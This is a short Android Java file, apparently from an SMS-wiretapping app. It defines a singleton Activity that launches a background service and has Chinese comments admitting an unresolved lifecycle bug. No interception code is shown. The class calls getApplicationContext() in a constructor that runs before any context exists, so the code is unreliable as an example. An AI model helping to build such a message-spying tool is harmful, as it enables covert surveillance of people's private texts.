package com.ckz.smswiretap.service;

import android.app.Activity;
import android.content.Intent;
/**
 * 单例模式
 * 开启服务
 * 服务销毁时，有问题。（服务销毁，对象又没销毁）??????????????
 * @author Administrator
 *
 */
public class SingletonWiretapService extends Activity{

	private static SingletonWiretapService sws = new SingletonWiretapService();

	private SingletonWiretapService(){
		Intent intent = new Intent(getApplicationContext(), StartService.class);
		startService(intent);
	}
	/**
	 * 单例模式开启服务
	 * @return
	 */
	public static SingletonWiretapService create(){
		return sws;
	}
}
